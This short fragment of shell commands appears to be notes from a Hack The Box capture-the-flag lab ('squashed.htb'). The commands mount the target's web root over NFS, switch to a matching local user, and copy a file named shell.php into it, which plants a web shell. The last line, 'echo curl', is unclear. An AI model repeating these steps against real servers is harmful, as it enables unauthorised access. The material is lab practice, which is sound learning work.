sudo mount -t nfs squashed.htb:/var/www/html www
sudo su dummy
cp shell.php www/
echo curl
